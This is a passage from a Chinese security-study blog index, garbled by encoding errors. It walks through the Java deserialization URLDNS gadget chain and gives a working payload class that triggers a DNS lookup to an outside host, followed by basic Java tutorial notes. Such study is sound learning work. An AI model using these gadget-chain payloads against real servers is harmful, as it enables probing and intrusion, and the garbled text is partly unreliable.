å…¥çš„å‚æ•°InvokerTransformerçš„transform()æ–¹æ³•ï¼ŒInvokerTransformer.transform()æ–¹æ³•é€šè¿‡åå°„é“¾è°ƒç”¨Runtime.getRuntime.exec(â€œxxâ€)å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</span><br></pre></td></tr></table></figure><p><strong>ä¸è¦æ‰¾åŒåå‡½æ•°è°ƒç”¨é™·å…¥å¾ªç¯</strong></p><p><strong>å¦‚æœç±»æ²¡æœ‰æ³¨æ˜ç±»å‹ï¼Œé»˜è®¤ä¸º defaultï¼Œå³åªèƒ½åœ¨æœ¬åŒ…å†…ä½¿ç”¨ï¼Œéœ€è¦ç”¨åå°„è°ƒç”¨æ‰§è¡Œ</strong></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaååºåˆ—åŒ–ä¹‹URLDNS</title>
      <link href="/2023/05/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E9%93%BE/"/>
      <url>/2023/05/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h1><p><a href="https://cloud.tencent.com/developer/article/1887019">IDEAä¸­çš„debugæ–­ç‚¹è°ƒè¯•æŠ€å·§ï¼Œå­¦ä¼šçœŸçš„é¦™ï¼ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p><p><a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">(72æ¡æ¶ˆæ¯) IntelliJ IDEAåˆ›å»ºServletæœ€æ–°æ–¹æ³• Ideaç‰ˆæœ¬2020.2.2ä»¥åŠIntelliJ IDEAåˆ›å»ºServlet 404é—®é¢˜ï¼ˆè¶…è¯¦ç»†ï¼‰_ideaåˆ›å»ºservleté¡¹ç›®_Granger_gçš„åšå®¢-CSDNåšå®¢</a></p><h2 id="ysoserial-è°ƒè¯•"><a href="#ysoserial-è°ƒè¯•" class="headerlink" title="ysoserial è°ƒè¯•"></a>ysoserial è°ƒè¯•</h2><p>ä¸‹è½½æºç ï¼Œç­‰å¾…mavenå¯¼å…¥ä¾èµ–ï¼Œå†é…ç½®å¦‚ä¸‹å³å¯ï¼ˆjavaç‰ˆæœ¬ä¸ºjava8ï¼‰</p><p><img src="/../images/image-20230502220543589.png" alt="image-20230502220543589"></p><h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>â€‹åœ¨javaä¸­ï¼Œå¦‚æœè¦å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡çš„ç±»å¿…é¡»è¦å®ç°<code>java.io.Serializable</code>æ¥å£ã€‚</p><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><p>åºåˆ—åŒ–<code>writeObject</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line"></span><br><span class="line">oos.writeObject(obj);</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–<code>readObject</code> </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br></pre></td></tr></table></figure><h3 id="åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶å„ä»£ç å—çš„æ‰§è¡Œé¡ºåº"><a href="#åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶å„ä»£ç å—çš„æ‰§è¡Œé¡ºåº" class="headerlink" title="åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶å„ä»£ç å—çš„æ‰§è¡Œé¡ºåº"></a>åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶å„ä»£ç å—çš„æ‰§è¡Œé¡ºåº</h3><p><img src="/../images/image-20230503114055054.png" alt="image-20230503114055054"></p><p><code>static &#123;&#125;</code>  â†’  <code>&#123;&#125;</code>  â†’  æ„é€ å‡½æ•°</p><h3 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h3><p>ååºåˆ—æ—¶, å¦‚æœå­—èŠ‚æµä¸­çš„serialVersionUIDä¸ç›®æ ‡æœåŠ¡å™¨å¯¹åº”ç±»ä¸­çš„serialVersionUIDä¸åŒæ—¶å°±ä¼šå‡ºç°å¼‚å¸¸ï¼Œé€ æˆååºåˆ—åŒ–å¤±è´¥ã€‚</p><p><img src="/../images/1615523079000-30cnxtq.png-w331s" alt="å›¾ç‰‡"></p><p>SUIDä¸åŒæ˜¯jaråŒ…ç‰ˆæœ¬ä¸åŒæ‰€é€ æˆï¼Œä¸åŒç‰ˆæœ¬jaråŒ…å¯èƒ½å­˜åœ¨ä¸åŒçš„è®¡ç®—æ–¹å¼å¯¼è‡´ç®—å‡ºçš„SUIDä¸åŒï¼Œè¿™ç§æƒ…å†µä¸‹åªéœ€è¦åŸºäºç›®æ ‡ä¸€æ ·çš„jaråŒ…ç‰ˆæœ¬å»ç”Ÿæˆpayloadå³å¯è§£å†³å¼‚å¸¸ï¼Œè¿›è€Œæå‡ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æˆåŠŸç‡ã€‚</p><h3 id="ååºåˆ—åŒ–æ•°æ®æ ‡å¿—"><a href="#ååºåˆ—åŒ–æ•°æ®æ ‡å¿—" class="headerlink" title="ååºåˆ—åŒ–æ•°æ®æ ‡å¿—"></a>ååºåˆ—åŒ–æ•°æ®æ ‡å¿—</h3><p><code>AC ED 00 05</code></p><p><img src="/../images/image-20230913163905803.png" alt="image-20230913163905803"></p><h2 id="URLDNSé“¾"><a href="#URLDNSé“¾" class="headerlink" title="URLDNSé“¾"></a>URLDNSé“¾</h2><p>åˆ†æçš„æ—¶å€™å‘ç°éœ€è¦æ³¨é‡Šæ‰<code>ysoserial</code>é‡å†™çš„<img src="/../images/image-20230502230402644.png" alt="image-20230502230402644"></p><blockquote><p>ysoserialä¸ºäº†é˜²â½Œåœ¨â½£æˆPayloadçš„æ—¶å€™ä¹Ÿæ‰§â¾äº†URLè¯·æ±‚å’ŒDNSæŸ¥è¯¢ï¼Œæ‰€ä»¥é‡å†™äº†â¼€ ä¸ª SilentURLStreamHandler ç±»ã€‚</p></blockquote><h3 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h3><p>å¦‚ä½•å¯»æ‰¾å¯èƒ½å…·æœ‰ååºåˆ—åŒ–æ¼æ´çš„ç±»ï¼Ÿ</p><p>è¦æœ‰<code>readObject</code>æ–¹æ³•ï¼Œæ‰€ä»¥ç›´å¥”<code>HashMap</code>çš„<code>readObject</code>æ–¹æ³•</p><p><img src="/../images/image-20230502233642388.png" alt="image-20230502233642388"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>åœ¨<code>ysoserial</code>ä¸­æ‰“ä¸‹æ–­ç‚¹</p><p><img src="/../images/image-20230502233910801.png" alt="image-20230502233910801"></p><p>è·Ÿè¿›<code>put</code></p><p><img src="/../images/image-20230502233952861.png" alt="image-20230502233952861"></p><p>è·Ÿè¿›<code>hash</code></p><p><img src="/../images/image-20230502234020014.png" alt="image-20230502234020014"></p><p>è·Ÿè¿›<code>hashCode</code></p><p><img src="/../images/image-20230502234105324.png" alt="image-20230502234105324"></p><p>è·Ÿè¿›<code>handler.hashCode</code></p><p><img src="/../images/image-20230502234135313.png" alt="image-20230502234135313"></p><p>è·Ÿè¿›<code>getHostAddress</code></p><p><img src="/../images/image-20230502235424673.png" alt="image-20230502235424673"></p><p>è¿™é‡Œå¤šäº†ä¸€æ­¥ï¼Œå¯èƒ½æ˜¯ç‰ˆæœ¬é—®é¢˜å§ï¼Ÿ</p><p><img src="/../images/image-20230502234312446.png" alt="image-20230502234312446"></p><p>è¿™â¾¥ InetAddress.getByName(host) çš„ä½œç”¨æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶IPåœ°å€ï¼Œåœ¨ç½‘ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡ DNSæŸ¥è¯¢ã€‚</p><p><code>Gadget Chain</code></p><p><img src="/../images/image-20230502234635733.png" alt="image-20230502234635733"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">HashMap.hash()</span><br><span class="line">URL.hashCode()ï¼šField hashCode=-<span class="number">1</span></span><br><span class="line">URLStreamHandler-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;getHostAddress()</span><br><span class="line">URL-&gt;getHostAddress()    </span><br><span class="line">InetAddress-&gt;getByName()</span><br></pre></td></tr></table></figure><p>éœ€è¦å®ä¾‹åŒ–ä¸‰ä¸ªç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap</span><br><span class="line">URLStreamHandler</span><br></pre></td></tr></table></figure><p>æ— å‚æ„é€ ï¼Œç›´æ¥<code>new</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230503000931008.png" alt="image-20230503000931008"></p><p>payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNSTestDemo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://123.1020fd40.ipv6.1433.eu.org&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡åå°„ä¿®æ”¹ç§æœ‰å±æ€§hashCodeä¸º-1</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> u.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(u, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hm.put(u, url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230503001328190.png" alt="image-20230503001328190"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaæ³›å‹</title>
      <link href="/2023/05/01/JAVA%E5%9F%BA%E6%9C%AC%E4%BA%86%E8%A7%A3/"/>
      <url>/2023/05/01/JAVA%E5%9F%BA%E6%9C%AC%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVAåŸºæœ¬äº†è§£"><a href="#JAVAåŸºæœ¬äº†è§£" class="headerlink" title="JAVAåŸºæœ¬äº†è§£"></a>JAVAåŸºæœ¬äº†è§£</h1><p><a href="https://blog.csdn.net/MinggeQingchun/article/details/120578602">(71æ¡æ¶ˆæ¯) Javaâ€“Javaç‰ˆæœ¬å’ŒJDKç‰ˆæœ¬_javaç‰ˆæœ¬å’Œjdkç‰ˆæœ¬åŒºåˆ«_MinggeQingchunçš„åšå®¢-CSDNåšå®¢</a></p><p>![image-20230501122332032](E:\typora img\image-20230501122332032.png)</p><p>JDK8u311 â†’ JAVA8</p><h3 id="javaåè¯"><a href="#javaåè¯" class="headerlink" title="javaåè¯"></a>javaåè¯</h3><p>Javaæ˜¯å°†ä»£ç ç¼–è¯‘æˆä¸€ç§â€œå­—èŠ‚ç â€ï¼Œå®ƒç±»ä¼¼äºæŠ½è±¡çš„CPUæŒ‡ä»¤ï¼Œç„¶åï¼Œé’ˆå¯¹ä¸åŒå¹³å°ç¼–å†™è™šæ‹Ÿæœºï¼Œä¸åŒå¹³å°çš„è™šæ‹Ÿæœºè´Ÿè´£åŠ è½½å­—èŠ‚ç å¹¶æ‰§è¡Œï¼Œè¿™æ ·å°±å®ç°äº†â€œä¸€æ¬¡ç¼–å†™ï¼Œåˆ°å¤„è¿è¡Œâ€çš„æ•ˆæœã€‚</p><p>![image-20230425225221871](E:\typora img\image-20230425225221871.png)</p><p>![image-20230425225139403](E:\typora img\image-20230425225139403.png)</p><p>![image-20230425225121609](E:\typora img\image-20230425225121609.png)</p><p>jaråŒ…å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªzipæ ¼å¼çš„å‹ç¼©æ–‡ä»¶</p><h3 id="è¿è¡Œjavaç¨‹åº"><a href="#è¿è¡Œjavaç¨‹åº" class="headerlink" title="è¿è¡Œjavaç¨‹åº"></a>è¿è¡Œjavaç¨‹åº</h3><p>![image-20230425225313657](E:\typora img\image-20230425225313657.png)</p><p>ä¸€ä¸ªJavaæºç åªèƒ½å®šä¹‰ä¸€ä¸ª<code>public</code>ç±»å‹çš„classï¼Œå¹¶ä¸”classåç§°å’Œæ–‡ä»¶åè¦å®Œå…¨ä¸€è‡´ï¼›</p><p>æ³¨æ„ï¼š</p><p>æˆ‘ä»¬é€šå¸¸è¯´çš„Java 8ï¼ŒJava 11ï¼ŒJava 17ï¼Œæ˜¯æŒ‡JDKçš„ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯JVMçš„ç‰ˆæœ¬</p><p>è€Œæ¯ä¸ªç‰ˆæœ¬çš„JVMï¼Œå®ƒèƒ½æ‰§è¡Œçš„classæ–‡ä»¶ç‰ˆæœ¬ä¹Ÿä¸åŒã€‚ä¾‹å¦‚ï¼ŒJava 11å¯¹åº”çš„classæ–‡ä»¶ç‰ˆæœ¬æ˜¯55ï¼Œè€ŒJava 17å¯¹åº”çš„classæ–‡ä»¶ç‰ˆæœ¬æ˜¯61ã€‚</p><p><strong>é«˜ç‰ˆæœ¬çš„JDKå¯ç¼–è¯‘è¾“å‡ºä½ç‰ˆæœ¬å…¼å®¹çš„classæ–‡ä»¶</strong>ï¼Œä½†éœ€æ³¨æ„ï¼Œä½ç‰ˆæœ¬çš„JDKå¯èƒ½ä¸å­˜åœ¨é«˜ç‰ˆæœ¬JDKæ·»åŠ çš„ç±»å’Œæ–¹æ³•ï¼Œå¯¼è‡´è¿è¡Œæ—¶æŠ¥é”™ã€‚</p><p>è¿è¡Œæ—¶ä½¿ç”¨å“ªä¸ªJDKç‰ˆæœ¬ï¼Œç¼–è¯‘æ—¶å°±å°½é‡ä½¿ç”¨åŒä¸€ç‰ˆæœ¬ç¼–è¯‘æºç ã€‚</p><h3 id="ç±»ä¸å¯¹è±¡"><a href="#ç±»ä¸å¯¹è±¡" class="headerlink" title="ç±»ä¸å¯¹è±¡"></a>ç±»ä¸å¯¹è±¡</h3><h4 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><p>![image-20230425225605486](E:\typora img\image-20230425225605486.png)</p><p>![image-20230425225757719](E:\typora img\image-20230425225757719.png)</p><p>å®šä¹‰privateå­—æ®µå’Œpubilcæ–¹æ³•æ¥æ“ä½œprivateå­—æ®µ</p><blockquote><p>è™½ç„¶å¤–éƒ¨ä»£ç ä¸èƒ½ç›´æ¥ä¿®æ”¹<code>private</code>å­—æ®µï¼Œä½†æ˜¯ï¼Œå¤–éƒ¨ä»£ç å¯ä»¥è°ƒç”¨æ–¹æ³•<code>setName()</code>å’Œ<code>setAge()</code>æ¥é—´æ¥ä¿®æ”¹<code>private</code>å­—æ®µã€‚åœ¨æ–¹æ³•å†…éƒ¨ï¼Œæˆ‘ä»¬å°±æœ‰æœºä¼šæ£€æŸ¥å‚æ•°å¯¹ä¸å¯¹ã€‚æ¯”å¦‚ï¼Œ<code>setAge()</code>å°±ä¼šæ£€æŸ¥ä¼ å…¥çš„å‚æ•°ï¼Œå‚æ•°è¶…å‡ºäº†èŒƒå›´ï¼Œç›´æ¥æŠ¥é”™ã€‚è¿™æ ·ï¼Œå¤–éƒ¨ä»£ç å°±æ²¡æœ‰ä»»ä½•æœºä¼šæŠŠ<code>age</code>è®¾ç½®æˆä¸åˆç†çš„å€¼ã€‚</p></blockquote><p>å®šä¹‰privateæ–¹æ³•</p><blockquote><p><code>private</code>æ–¹æ³•ï¼Œå¤–éƒ¨ä»£ç æ— æ³•è°ƒç”¨ï¼Œä½†æ˜¯ï¼Œå†…éƒ¨æ–¹æ³•å¯ä»¥è°ƒç”¨å®ƒã€‚</p><p>æ–¹æ³•å¯ä»¥å°è£…ä¸€ä¸ªç±»çš„å¯¹å¤–æ¥å£ï¼Œè°ƒç”¨æ–¹ä¸éœ€è¦çŸ¥é“ä¹Ÿä¸å…³å¿ƒå­—æ®µæ˜¯å¦å­˜åœ¨</p></blockquote><h4 id="Java-Bean"><a href="#Java-Bean" class="headerlink" title="Java Bean"></a>Java Bean</h4><blockquote><p>JavaBeanæ˜¯ä¸€ç§ç¬¦åˆå‘½åè§„èŒƒçš„<code>class</code>ï¼Œå®ƒé€šè¿‡<code>getter</code>å’Œ<code>setter</code>æ¥å®šä¹‰å±æ€§ï¼›</p></blockquote><p>ä¾‹å­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.age; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123; <span class="built_in">this</span>.age = age; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h4><p>![image-20230425233400613](E:\typora img\image-20230425233400613.png)</p><h4 id="æŠ½è±¡ç±»"><a href="#æŠ½è±¡ç±»" class="headerlink" title="æŠ½è±¡ç±»"></a>æŠ½è±¡ç±»</h4><blockquote><p>å¦‚æœä¸€ä¸ª<code>class</code>å®šä¹‰äº†æ–¹æ³•ï¼Œä½†æ²¡æœ‰å…·ä½“æ‰§è¡Œä»£ç ï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯æŠ½è±¡æ–¹æ³•ï¼ŒæŠ½è±¡æ–¹æ³•ç”¨<code>abstract</code>ä¿®é¥°ã€‚</p><p>å› ä¸ºæ— æ³•æ‰§è¡ŒæŠ½è±¡æ–¹æ³•ï¼Œå› æ­¤è¿™ä¸ªç±»ä¹Ÿå¿…é¡»ç”³æ˜ä¸ºæŠ½è±¡ç±»ï¼ˆabstract classï¼‰ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ä½¿ç”¨<code>abstract</code>ä¿®é¥°çš„ç±»å°±æ˜¯æŠ½è±¡ç±»ã€‚æˆ‘ä»¬æ— æ³•å®ä¾‹åŒ–ä¸€ä¸ªæŠ½è±¡ç±»ï¼š</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(); <span class="comment">// ç¼–è¯‘é”™è¯¯</span></span><br></pre></td></tr></table></figure><blockquote><p>æ— æ³•å®ä¾‹åŒ–çš„æŠ½è±¡ç±»æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</p><p>å› ä¸ºæŠ½è±¡ç±»æœ¬èº«è¢«è®¾è®¡æˆåªèƒ½ç”¨äºè¢«ç»§æ‰¿ï¼Œå› æ­¤ï¼ŒæŠ½è±¡ç±»å¯ä»¥å¼ºè¿«å­ç±»å®ç°å…¶å®šä¹‰çš„æŠ½è±¡æ–¹æ³•ï¼Œå¦åˆ™ç¼–è¯‘ä¼šæŠ¥é”™ã€‚å› æ­¤ï¼ŒæŠ½è±¡æ–¹æ³•å®é™…ä¸Šç›¸å½“äºå®šä¹‰äº†â€œè§„èŒƒâ€ï¼šå³è§„å®šé«˜å±‚ç±»çš„æ¥å£ï¼Œä»è€Œä¿è¯æ‰€æœ‰å­ç±»éƒ½æœ‰ç›¸åŒçš„æ¥å£å®ç°ï¼Œè¿™æ ·ï¼Œå¤šæ€å°±èƒ½å‘æŒ¥å‡ºå¨åŠ›ã€‚</p></blockquote><h4 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h4><blockquote><p>å¦‚æœä¸€ä¸ªæŠ½è±¡ç±»æ²¡æœ‰å­—æ®µï¼Œæ‰€æœ‰æ–¹æ³•å…¨éƒ¨éƒ½æ˜¯æŠ½è±¡æ–¹æ³•ï¼Œå°±å¯ä»¥æŠŠè¯¥æŠ½è±¡ç±»æ”¹å†™ä¸ºæ¥å£ï¼š<code>interface</code>ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">    String <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ä¸€ä¸ªå…·ä½“çš„<code>class</code>å»å®ç°ä¸€ä¸ª<code>interface</code>æ—¶ï¼Œéœ€è¦ä½¿ç”¨<code>implements</code>å…³é”®å­—ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name + <span class="string">&quot; run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥å£çš„ç»§æ‰¿</p><p>![image-20230425233728359](E:\typora img\image-20230425233728359.png)</p><h4 id="é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•"><a href="#é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•" class="headerlink" title="é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•"></a>é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•</h4><blockquote><p>ä¿®é¥°ç¬¦static</p><p>é™æ€æ–¹æ³•å’Œé™æ€å­—æ®µå±äº<code>class</code>è€Œä¸å±äºå®ä¾‹</p></blockquote><p>![image-20230425234023210](E:\typora img\image-20230425234023210.png)</p><p>ä½¿ç”¨ç±»åæ¥è®¿é—®</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person.setNumber(<span class="number">99</span>);</span><br><span class="line">System.out.println(Person.number);</span><br></pre></td></tr></table></figure><h4 id="åŒ…"><a href="#åŒ…" class="headerlink" title="åŒ…"></a>åŒ…</h4><blockquote><p>ä¸€ä¸ªåŒ…å°±æ˜¯ä¸€ä¸ªå‘½åç©ºé—´</p><p>çœŸæ­£çš„å®Œæ•´ç±»åæ˜¯<code>åŒ…å.ç±»å</code></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> xxx; <span class="comment">// ç”³æ˜åŒ…å</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> packge_name.class_name; <span class="comment">// å¯¼å…¥å…¶ä»–åŒ…ä¸­çš„ç±»</span></span><br></pre></td></tr></table></figure><h4 id="å¸¸ç”¨ç±»"><a href="#å¸¸ç”¨ç±»" class="headerlink" title="å¸¸ç”¨ç±»"></a>å¸¸ç”¨ç±»</h4><p><img src="/../blog/source/images/java.lang.png" alt="img"></p><h5 id="Stringå¯¹è±¡"><a href="#Stringå¯¹è±¡" class="headerlink" title="Stringå¯¹è±¡"></a>Stringå¯¹è±¡</h5><blockquote><p>Javaä¸­çš„Stringæ˜¯ä¸å¯å˜çš„ï¼Œå› ä¸ºStringç±»çš„å­˜å‚¨æ˜¯é€šè¿‡finalä¿®é¥°çš„char[]æ•°ç»„æ¥å­˜æ”¾ç»“æœçš„ï¼Œä¸å¯æ›´æ”¹ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">        System.out.println(s.hashCode());</span><br><span class="line">        System.out.println(s.toUpperCase().hashCode());</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![image-20230428115645212](E:\typora img\image-20230428115645212.png)</p><h5 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h5><p>å†…å­˜æ•°æ®ä¸å¤–å­˜æ•°æ®ï¼Œä½¿ç”¨å­—èŠ‚æµæˆ–å­—ç¬¦æµ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="comment">// getInputStream()è·å¾—ç»“æœ</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span 